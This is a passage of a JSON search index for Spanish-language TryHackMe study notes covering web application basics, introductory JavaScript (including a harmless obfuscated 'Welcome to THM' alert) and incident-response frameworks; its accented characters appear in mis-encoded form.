ejemplo.\n- **Infraestructura:** Hay muchas como los servidores web, los dispositivos red, la red en s√≠. En nuestro planeta ser√≠an las carreteras, los coches y la gasolina.\n- **WAF (Web Application Firewall):** Es un componente opcional pero que mejora la seguridad. Esto podr√≠a ser comparado con la capa de Ozono.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Web Application Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/1-web-application-basics/0-web-application-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/0. Web Application Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 1. Web Application Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/1. Web Application Basics/1. Introduction]]\n[[2. Web Application Overview]]\n[[3. Uniform Resource Locator]]\n[[4. HTTP Messages]]\n[[5. HTTP Request - Request Line and Methods]]\n[[6. HTTP Request - Headers and Body]]\n[[7. HTTP Response - Status Line and Status Codes]]\n[[8. HTTP Response - Headers and Body]]\n[[9. Security Headers]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. JavaScript Essentials",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/0-javascript-essentials/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/0. JavaScript Essentials.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/1. Introduction]]\n[[2. Essential Concepts]]\n[[3. JavaScript Overview]]\n[[4. Integrating JavaScript in HTML]]\n[[5. Abusing Dialogue Functions]]\n[[6. Bypassing Control Flow Statementes]]\n[[7. Exploring Minified Files]]\n[[8. Best Practices]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "JavaScript es un lenguaje popular de scripting que permite a los desarrolladores web a√±adir funcionalidades interactivas a sitios web que contienen HTML y CSS. Una vez que los elementos HTML se han creado, puedes a√±adir interactividad como validaci√≥n, acciones al hacer click, animaciones, etc, mediante JS.\n\nEsta unidad est√° dise√±ada como una primera vista de JavaScript. Est√° enfocada a principiantes y se centra en ver c√≥mo los atacantes usan funcionalidades leg√≠timas para conseguir resultados maliciosos.\n\n-------------------\n<h2>Pre-requisitos</h2>\n[[4. Linux Fundamentals]]\n[[0. Web Application Basics]]\n[[0. How Websites Work]]\n\n-------------\n<h2>Objetivos de aprendizaje</h2>\n- Comprender lo b√°sico de JS\n- Integrar JS en HTML\n- Abusar la Funci√≥n de Di√°logo\n- Bypassear los Statements de Control de Flujo\n- Explorar los Archivos Minified",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Bypassing Control Flow Statementes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/6-bypassing-control-flow-statementes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/6. Bypassing Control Flow Statementes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "El flujo de control en JS se refiere al orden con el que los bloques y las declaraciones de c√≥digo son ejecutados en base a ciertas condiciones. JS ofrece varias estructuras de control de flujo como `if-else`, `switch`, `for`, `while` y `do...while`.\n\n---------------------\n<h2>Condicionales en Acci√≥n</h2>\nUno de los condicionales m√°s usados es `if-else`. Este permite ejecutar diferentes bloques de c√≥digo en funci√≥n de una condici√≥n evaluada en `true` (verdadero) o `false` (falso).\n\n<h6>Ejemplo</h6>\n ```html\n <!DOCTYPE html> \n <html lang=\"en\"> \n <head>     \n\t <title>Age Verification</title> \n </head> \n <body>     \n\t <h1>Age Verification</h1>     \n\t <p id=\"message\"></p>      \n\t \n\t <script>         \n\t\t age = prompt(\"What is your age\")         \n\t\t if (age >= 18) {             \n\t\t\t document.getElementById(\"message\").innerHTML = \"You are an adult.\";         \n\t\t } else {             \n\t\t\t document.getElementById(\"message\").innerHTML = \"You are a minor.\";         \n\t\t }     \n\t </script> \n </body>\n </html>\n ```\n\nSi introduces una edad menor de 18 a√±os en el prompt, la p√°gina web pondr√° que eres menor y en caso contrario pondr√° que eres mayor.\n\n--------------------\n<h2>Bypasseando Formularios de Inicio de Sesi√≥n</h2>\nImagina que un admin ha hecho una p√°gina que contiene internamente el c√≥digo JS necesario para validar el inicio de sesi√≥n. Puedes abrir el c√≥digo fuente y leer las credenciales.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Exploring Minified Files",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/7-exploring-minified-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/7. Exploring Minified Files.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "Hemos entendido c√≥mo JS funciona y c√≥mo podemos leerlo, pero ¬øqu√© pasa si no es le√≠ble por humanos (ha sido minified)?\n\nLa minificaci√≥n en JS es el proceso de comprimir archivos JS eliminando todos los caracteres inservibles, como espacios, comentarios, etc. Esto ayuda a reducir el tama√±o del archivo y a mejorar el tiempo de carga de las p√°ginas web. Hace el c√≥digo m√°s compacto y m√°s dif√≠cil de leer para humanos.\n\nDe forma similar, la ofuscaci√≥n es com√∫nmente usada para hacer JS m√°s dif√≠cil de entender, renombrando variables y funciones a nombres sin sentido, incluso integrando c√≥digo falso.\n\n---------------------\n<h2>Ejemplo Pr√°ctico</h2>\nCreamos un documento `hello.html` con el siguiente contenido:\n\n```html\n<!DOCTYPE html> \n<html lang=\"en\"> \n<head>     \n\t <title>Obfuscated JS Code</title> \n</head> \n<body>     \n\t<h1>Obfuscated JS Code</h1>     \n\t<script src=\"hello.js\"></script> \n</body> \n</html>\n```\n\nY un `hello.js` con el contenido:\n\n```js\nfunction hi() {\n\talert(\"Welcome to THM\");\n}\nhi();\n```\n\nAbre la p√°gina, haz click en `OK` y dir√≠gete a `Inspeccionar`. Entonces navega hasta `Sources` y haz click en `hello.js`. Ver√°s as√≠ que el c√≥digo `.js` es visible y accesible.\n\n--------------------\n<h2>Ofuscaci√≥n en Acci√≥n</h2>\nAhora, trataremos de minificarlo y ofuscarlo usando una herramienta [online](https://codebeautify.org/javascript-obfuscator). Copia y pega el c√≥digo de `hello.js`. El resultado:\n\n```javascript\n(function(_0x114713,_0x2246f2){var _0x51a830=_0x33bf,_0x4ce60b=_0x114713();while(!![]){try\n{var _0x51ecd3=-parseInt(_0x51a830(0x88))/(-0x1bd3+-0x9a+0x2*0xe37)*(parseInt(_0x51a830(0x94))/\n(-0x15c1+-0x2*-0x3b3+0xe5d))+parseInt(_0x51a830(0x8d))/(0x961*0x1+0x2*0x4cb+0x4bd*-0x4)*\n(-parseInt(_0x51a830(0x97))/(-0x22b3+0x16e9+0x1*0xbce))+parseInt(_0x51a830(0x89))/\n(-0x631+0x20cd+0x8dd*-0x3)*(-parseInt(_0x51a830(0x95))/(-0x8fc+0x161+0x7a1))+-\nparseInt(_0x51a830(0x93))/(-0x1c38+0x193+0x1aac)*(parseInt(_0x51a830(0x8e))/\n(-0x1*-0x17a6+-0x167e+-0x3*0x60))+-parseInt(_0x51a830(0x91))/(-0x2*-0x1362+-0x4a8*0x5+-0xf73)*\n(parseInt(_0x51a830(0x8b))/(-0xb31*0x2+0x493*0x5+0x1*-0x73))+parseInt(_0x51a830(0x8f))/\n(-0x257a+-0x1752+0x3cd7)+parseInt(_0x51a830(0x90))/(-0x2244+-0x15f9+0x3849);if(_0x51ecd3\n===_0x2246f2)break;else _0x4ce60b['push'](_0x4ce60b['shift']());}catch(_0x38d15c)\n{_0x4ce60b['push'](_0x4ce60b['shift']());}}}(_0x11ed,-0x17d11*-0x1+0x2*0x2e27+0x100f*0x17));\nfunction hi(){var _0x48257e=_0x33bf,_0xab1127={'xMVHQ':function(_0x4eefa0,_0x4e5f74)\n{return _0x4eefa0(_0x4e5f74);},'FvtWc':_0x48257e(0x96)+_0x48257e(0x92)};_0xab1127[_0x48257e(0x8c)\n](alert,_0xab1127[_0x48257e(0x8a)]);}function _0x33bf(_0xb07259,_0x5949fe){var _0x3a386b\n=_0x11ed();return _0x33bf=function(_0x4348ee,_0x1bbf73){_0x4348ee=_0x4348ee-(0x11f7+-\n0x1*0x680+-0x3a5*0x3);var _0x423ccd=_0x3a386b[_0x4348ee];return _0x423ccd;},_0x33bf\n(_0xb07259,_0x5949fe);}function _0x11ed(){var _0x4c8fa8=['7407EbJESQ','\\x20THM',\n'2700698TTmqXC','10ILFtfZ','190500QONgph','Welcome\\x20to',\n'4492QOmepo','21623eEAyaP','65XMlsxw','FvtWc','2410qfnGAy','xMVHQ','321PfYXZg',\n'8XBaIAe','1946483GviJfa','15167592PYYhTN'];_0x11ed=function(){return _0x4c8fa8;};return _0x11ed();}hi();\n```\n\nPega ahora el nuevo c√≥digo eliminando el antiguo de `hello.js`. Recarga la p√°gina. Deber√≠a de seguir funcionando exactamente igual.\n\n-------------------\n<h2>Des-Ofuscar un C√≥digo</h2>\nPodemos tambi√©n desofuscar un c√≥digo ofuscado con una herramienta [online](https://obf-io.deobfuscate.io/). Copia y pega el c√≥digo ofuscado en ella y obt√©n el resultado desofuscado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. JavaScript Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/3-javascript-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/3. JavaScript Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "En esta lecci√≥n usaremos JS para crear un programa. JS es un lenguaje interpretado, es decir que se ejecuta en el navegador sin previa compilaci√≥n. Aqu√≠ hay un ejemplo de un c√≥digo en JS haciendo cosas muy b√°sicas:\n\n```javascript\n// Hello, World! program\nconsole.log(\"Hello, World!\");\n\n// Variable and Data Type\nlet age = 25; // Number type\n\n// Control Flow Statement\nif (age >= 18) {\n    console.log(\"You are an adult.\");\n} else {\n    console.log(\"You are a minor.\");\n}\n\n// Function\nfunction greet(name) {\n    console.log(\"Hello, \" + name + \"!\");\n}\n\n// Calling the function\ngreet(\"Bob\");\n```\n\nJS es mayormente ejecutado del lado del cliente, lo que lo hace de f√°cil interacci√≥n e inspecci√≥n con HTML desde el navegador. Usaremos la consola de google chrome.\n\n- Una vez en Chrome, pulsamos `Ctrl + Shift + I` o `click derecho > inspeccionar > consola`.\n- Vamos a hacer un c√≥digo simple en JS que sume dos n√∫meros y muestre el resultado:\n  ```javascript\nlet x = 5;\nlet y = 10;\nlet result = x + y;\nconsole.log(\"The result is: \" + result);\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Best Practices",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/8-best-practices/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/8. Best Practices.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "En esta lecci√≥n vemos las mejores pr√°cticas para una p√°gina web.\n\n------------------\n<h2>Evita Confiar en la Validaci√≥n del Lado del Cliente S√≥lamente</h2>\nUna de las funciones primarias de JS es realizar validaci√≥n client-side. Sin embargo confiar ciegamente en ella puede llevar a brechas de seguridad, ya que el usuario puede cambiarlo o deshabilitarlo.\n\n--------------------\n<h2>Recapacita antes de A√±adir Librer√≠as</h2>\nSi instalas una librer√≠a de una fuente poco confiable y resulta no ser segura estar√°s exponiendo toda tu aplicaci√≥n web, por eso debes de tener cuidado con las librer√≠as que utilizas.\n\n--------------------\n<h2>Evita Secretos Hardcodeados</h2>\nNunca hardcodees informaci√≥n sensible como contrase√±as.\n\n--------------------\n<h2>Minifica y Ofusca tu C√≥digo de JavaScript</h2>\nEsta pr√°ctica reduce el tama√±o, mejora la eficiencia y hace m√°s dif√≠cil la lectura del c√≥digo a los humanos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Integrating JavaScript in HTML",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/4-integrating-javascript-in-html/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/4. Integrating JavaScript in HTML.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "Esta lecci√≥n asume que tienes conocimiento b√°sico sobre HTML y su estructura.Esta secci√≥n explorar√° c√≥mo JS puede ser integrada en HTML. Normalmente no se usa para renderizar contenido sino que trabaja con HTML y CSS para crear p√°ginas din√°micas e interactivas. Ha dos formas principales de integrar JS en HTML: internamente y externamente.\n\n---------------\n<h2>JavaScript Interno</h2>\nSe refiere a incrustar el c√≥digo JS directamente en un documento HTML. Este m√©todo es mejor para principiantes porque les permite ver c√≥mo el script interact√∫a con HTML. El script se inserta entre etiquetas `<script></script>`. Estos pueden ser colocados dentro e la secci√≥n `<head>` para c√≥digos que necesiten ser cargados antes de que se renderice el contenido de la p√°gina o en el `<body>` donde el c√≥digo podr√° interactuar con los elementos de la p√°gina seg√∫n se carguen.\n\n<h6>Ejemplo</h6>\n```html\n <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <title>Internal JS</title>\n</head>\n<body>\n    <h1>Addition of Two Numbers</h1>\n    <p id=\"result\"></p>\n\n    <script>\n        let x = 5;\n        let y = 10;\n        let result = x + y;\n        document.getElementById(\"result\").innerHTML = \"The result is: \" + result;\n    </script>\n</body>\n</html>\n```\n\nEn este documento HTML estamos usando JS interno. El JS interact√∫a con el c√≥digo HTML seleccionando un elemento (`<p>` con id = \"result\") y actualiz√°ndo su contenido usando `document.getElementById(\"results\").innerHTML`. Este JS interno es ejecutado cuando el navegador carga la p√°gina.\n\n------------------\n<h2>JavaScript Externo</h2>\nEl JS externo implica crear y almacenar c√≥digo JS en un achivo separado que finaliza con la extensi√≥n `.js`. Este m√©todo ayuda a los desarrolladores a mantener el documento HTML limpio y organizado. El archivo externo JS puede ser albergado en el mismo servidor que el HTML o en un servidor externo.\n\nPodemos usar el mismo ejemplo para esta vez.\n\nPrimero creamos un archivo `script.js` con el contenido:\n\n```javascript\nlet x = 5;\nlet y = 10;\nlet result = x + y;\ndocument.getElementById(\"result\").innerHTML = \"The result is: \" + result;\n```\n\nY luego creamos el `external.html`:\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>External JS</title>\n</head>\n<body>\n    <h1>Addition of Two Numbers</h1>\n    <p id=\"result\"></p>\n\n    <!-- Link to the external JS file -->\n    <script src=\"script.js\"></script>\n</body>\n</html>\n```\n\nLo que hicimos fue usar el atributo `src` en el `<script>` para cargar el `.js` desde un archivo externo. Cuando el servidor carga la p√°gina busca el archivo `script.js` y lo carga. Este enfoque nos permite separar el c√≥digo JS manteniendo nuestro HTML m√°s limpio.\n\n--------------------\n<h2>Verificar JS Interno o Externo</h2>\nAl hacer pentesting de una aplicaci√≥n web es importante comprobar si el sitio usa JS interno o externo.Esto puede ser verificado f√°cilmente mirando el c√≥digo fuente de la p√°gina. Podemos hacerlo haciendo `Ctrl + U`.\n\nSi vemos un `<script>` con un `src` podemos concluir que la p√°gina est√° cargando un `.js` externo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Essential Concepts",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/2-essential-concepts/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/2. Essential Concepts.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "<h2>Variables</h2>\nLas variables son contenedores que te permiten guardar informaci√≥n en ellos. Cada variable tiene un nombre que permite manipularla y referenciarla. En JS hay tres m√©todos para declarar una variable: `var`, `let` y `const`. Mientras que `var` est√° orientada a las funciones, `let` y `const` son las dos orientadas a bloques.\n\n----------------\n<h2>Data Types</h2>\nEn JS, los data types definen el tipo de valor que una variable puede contener. Ejemplos son `string`, `number`, `boolean`, `null`, `undefined` u `object`.\n\n-----------------\n<h2>Funciones</h2>\nUna funci√≥n representa un bloque de c√≥digo dise√±ado para realizar una tarea concreta. Dentro de una funci√≥n, agrupas c√≥digo que necesita realizar una tarea similar. Por ejemplo si quisieses hacer que se imprimiese el resultado de algo:\n\n```js\n<script>\n        function PrintResult(rollNum) {\n            alert(\"Username with roll number \" + rollNum + \" has passed the exam\");\n            // any other logic to display the result\n        }\n\n        for (let i = 0; i < 100; i++) {\n            PrintResult(rollNumbers[i]);\n        }\n    </script>\n```\n\n\n---------------\n<h2>Loops</h2>\nLos bucles te permiten ejecutar un bloque de c√≥digo m√∫ltiples veces mientras una condici√≥n sea cierta. Bucles comunes en JS son `for`, `while` y `do...while`. De esta manera conseguimos no tener, por ejemplo, que llamar 100 veces a la funci√≥n sino hacer un bucle que la llame.\n\n-----------------\n<h2>Request-Response Cycle</h2>\nEs cuando el navegador (cliente) manda una petici√≥n a un servidor y este responde con la informaci√≥n pedida.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Abusing Dialogue Functions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/2-javascript-essentials/5-abusing-dialogue-functions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/2. JavaScript Essentials/5. Abusing Dialogue Functions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 2. JavaScript Essentials",
    "content": "Uno de los principales objetivos de JS es ofrecer cajas de di√°logo para interactuar con usuarios y actualizar de manera din√°mica. JS ofrece funciones pre-incorporadas para esto como `alert`, `prompt` y `confirm`. Estas funciones permiten a desarrolladores mostrar mensajes y obtener confirmaci√≥n del usuario. Si no se implementan de forma segura, los atacantes pueden explotar sus vulnerabilidades.\n\n-----------------\n<h2>Alert</h2>\nLa funci√≥n de alerta muestra un mensaje en una caja de di√°logo con un bot√≥n de `OK`, t√≠picamente usado para notificar al usuario.\n\n![[Pasted image 20250929233432.png]]\n\n------------------------\n<h2>Prompt</h2>\nLa funci√≥n de prompt muestra una caja de di√°logo que pide un input al usuario. Devuelve el valor introducido si se le da a `OK` y `null` si se le da a `Cancel`.\n\n![[Pasted image 20250929233714.png]]\n\n-----------------------\n<h2>Confirm</h2>\nLa funci√≥n confirm muestra una caja de di√°logo con un mensaje y dos botones, `OK` y `Cancel`. Devuelve true si el usuario aprieta en `OK` y false si selecciona `Cancel`.\n\n![[Pasted image 20250929233850.png]]\n\n--------------------\n<h2>¬øC√≥mo Explotan los Hackers la Funcionalidad?</h2>\nImagina que recibes un email de un desconocido con un documento HTML adjunto. El archivo parece inofensivo pero cuando lo abres, contiene JS que cambia tu experiencia en el navegador.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. What are Incidents",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/2-what-are-incidents/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/2. What are Incidents.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "Muchos procesos diferentes corren en nuestros dispositivos como port√°tiles, m√≥viles, etc. Algunos de estos procesos son interactivos, lo que significa que puedes realizar acciones como jugar a un juego o ver un v√≠deo. Tambi√©n hay algunos que no son interactivos corriendo en segundo plano, simplemente son necesarios. Cualquiera de estos dos tipos de procesos, al realizar acciones, deja un rastro llamado evento (log).\n\nLos eventos se generan en n√∫meros enormes, regularmente. Esto es porque muchos procesos corren en un mismo dispositivo, cada uno realizazndo diferentes rutinas, generando numerosos eventos. ¬øC√≥mo comprobamos si estos numerosos eventos apuntan a algo peligroso o destructivo ocurriendo en el ordenador? Ah√≠ entran en juego las soluciones de seguridad.\n\nCuando una soluci√≥n de seguridad encuentra un evento o grupo de estos asociado a una posible actividad da√±ina, dispara una alerta. El equipo de seguridad analiza esta alerta. Algunas son falsos positivos, mientras que otras pueden ser verdaderos positivos.\n\nLas alertas de verdaderos positivos son **Incidentes**. Asumiendo que la alerta es un incidente, el pr√≥ximo paso es darle un nivel de severidad. Se pueden categorizar los incidentes como **Low**, **Medium**, **High** o **Critical**.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Incident Response",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/1-introduction-to-incident-response/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/1. Introduction to Incident Response.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "Imagina vivir en una calle extremadamente insegura con cosas de mucho valor en tu casa. Debes estar pensando en tener un guardia de seguridad y unas pocas c√°maras CCTV en tu casa. Esconder el material valioso dentro de una sala bajo tierra es una buena idea si un intruso consigue entrar.\n\nA parte de estas medidas proactivas, ¬øconsideraste alguna vez c√≥mo las cosas funcionar√≠an si alguien bypasease exitosamente tu seguridad externa y ganase acceso a tu casa? Tambi√©n debes tomar ciertas medidas una vez que tu casa ya ha sido allanada.\n\nTomemos el ejemplo de arriba al reino digital. Probablemente hayas o√≠do a cerca de un ciberataque a alguna organizaci√≥n que caus√≥ que perdieran miles de d√≥lares. Casos como esos se reportan en internet a diario. A estos nos referimos como incidentes de ciberseguridad. \n\nIncident Response (respuesta a incidentes) desde el comienzo hasta el final. Desde el despliegue de la seguridad en varias √°reas para prevenir incidentes hasta pelear con ellos para minimizar su impacto.\n\n-----------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Vista de qu√© son los incidentes y sus niveles de severidad.\n- Tipos comunes de incidentes.\n- Fases de la respuesta a incidentes desde los frameworks SANS y NIST.\n- Herramientas para la detecci√≥n de incidentes y la respuesta junto con el rol de los playbooks.\n- Plan de respuesta a incidentes.\n\n---------------------------\n<h2>Pre-requisitos</h2>\n[[1. Introduction to Defensive Security]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Types of Incidents",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/3-types-of-incidents/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/3. Types of Incidents.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "La gente normalmente etiqueta cualquier actividad da√±ida asociada con el mundo digital como un intento de hacking. Puede ser correcto, pero es muy gen√©rico en t√©rminos de ciberseguridad. Los incidentes de seguridad pueden ser de varios tipos. En las tareas anteriores hemos visto c√≥mo una alerta de verdadero positivo, que se transform√≥ en un incidente despu√©s del an√°lisis del equipo de seguridad. Este estaba correlacionado con un email de phishing, que probablemente ven√≠a con un archivo adjunto malicioso. Si se descarga en el sistema este archivo, puede tener graves consecuencias. Algunos de los tipos de incidentes m√°s comunes son:\n\n- **Infecciones de Malware:** El malware es un programa malicioso que puede da√±ar el sistema, la red o una aplicaci√≥n. La mayor√≠a de incidentes son asociados con infecciones de malware. Hay varios tipos de malware, cada uno con su potencial √∫nico para causar da√±os. Son mayormente causados por archivos de texto, documentos, ejecutables, etc.\n- **Brechas de Seguridad:** Las brechas de seguridad ocurren cuando una persona no autorizadda consigue acceso a informaci√≥n confidencial. Son una de las m√°s da√±inas porque la mayor√≠a de las empresas recaen en informaci√≥n sensible o privada que s√≥lo el personal autorizado debe poder ver.\n- **Filtraciones de Informaci√≥n:** Son incidentes en los que la informaci√≥n confidencial de un individuo u organizaci√≥n es expuesto a entidades no autorizadas. Muchos atacantes usan estos data leaks para empeorar la reputaci√≥n de las empresas o personas o conseguir lo que quieren de ellas. Al contrario que las brechas de seguridad pueden pasar por accidente por parte de un usuario.\n- **Ataques de Insider:** Incidentes desde dentro de una organizaci√≥n. Cuando un empleado disgustado con la empresa le otorga o usa informaci√≥n confidencial que posee a un atacante o el mismo lo usa para fines maliciosos.\n- **Ataques de Denegaci√≥n de Servicio:** Ocurren cuando un atacante inunda la red, sistema o aplicaci√≥n de una compa√±ia y hace que se caiga. Como consecuencia, ning√∫n usuario tiene acceso al servicio.\n\nTodos estos incidentes tienen su impacto negativo potencial √∫nico en la v√≠ctima. No pueden ser comparados en t√©rminos de la severida del impacto que crean. Esto es porque un incidente particular puede ser desastroso para una organizaci√≥n pero pr√°cticamente inofensivo para otra.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Incident Response Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/0-incident-response-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/0. Incident Response Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "[[1. Introduction to Incident Response]]\n[[2. What are Incidents]]\n[[3. Types of Incidents]]\n[[4. Incident Response Process]]\n[[5. Incident Response Techniques]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Incident Response Process",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/4-incident-response-process/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/4. Incident Response Process.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
    "content": "En la tarea anterior hemos visto varios tipos de incidentes. A veces, manejar una variedad de incidentes en un entorno puede ser complicado. Debido a la naturaleza distintiva de los incidentes en las organizaciones, deber√≠a haber un proceso estructurado para respuesta a incidentes. Los frameworks de respuesta a incidentes nos ayudan a esto. Veremos los dos frameworks m√°s usados: SANS y NIST.\n\nEl framework de respuesta a incidentes SANS tiene 6 fases (PICERL):\n\n| Fase                 | Explicaci√≥n                                                                                                                        | Ejemplo                                                                                       |\n| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |\n| Preparaci√≥n          | Incluye construir los recursos necesarios para manejar el incidente.                                                               | Realizar entrenamiento para empleados sobre emails de phishing.                               |\n| Identificaci√≥n       | Busqueda de cualquier comportamiento inusual que indique un incidente.                                                             | Ver cantidades ingentes de informaci√≥n ser descargadas de un ordenador.                       |\n| Contenci√≥n           | Suele ser hecho aislando la m√°quina v√≠ctima, desactivando sus cuentas, etc.                                                        | Se a√≠sla un dispositivo de la red para no permitir al atacante pivotar.                       |\n| Erradicaci√≥n         | Incluye eliminar la amenaza del entorno atacado. Asegura la limpieza del entorno.                                                  | Se realiza un escaneo de malware exhaustivo en el equipo v√≠ctima.                             |\n| Recuperaci√≥n         | Incluye recuperar los sistemas afectados desde un backup o reconstruirlos.                                                         | El host comprometido fue reconfigurado y la informaci√≥n restaurada de una copia de seguridad. |\n| Lecciones Aprendidas | Una parte muy importante es reflexionar sobre por qu√© ha ocurrido lo ocurrido. Nos permite mejorar nuestros sistemas de seguridad. | Realizar una reuni√≥n post incidente para analizar las causas base.                            |\nEl framework de respuesta a incidentes NIST es similar al SANS. El n√∫mero de fases que tiene este se reduce a 4:\n\n![[Pasted image 20251021223143.png]]\n\nUna comparaci√≥n:\n\n![[Pasted image 20251021223201.png]]\n\nCada proceso tiene una forma de documentaci√≥n formal. El documento formal se llama Plan de Respuesta a Incidentes.\n\nLas partes clave de este documento (aunque no se limita a ellas) son:\n\n- Roles y Responsabilidades.\n- Metodolog√≠a de Respuesta a Incidentes.\n- Comunicaci√≥n con accionistas y cuerpos de seguridad.\n- Camino de escalada a seguir.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Incident Response Techniques",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/4-incident-response-fundamentals/5-incident-response-techniques/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/4. Incident Response Fundamentals/5. Incident Response Techniques.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 4. Incident Response Fundamentals",
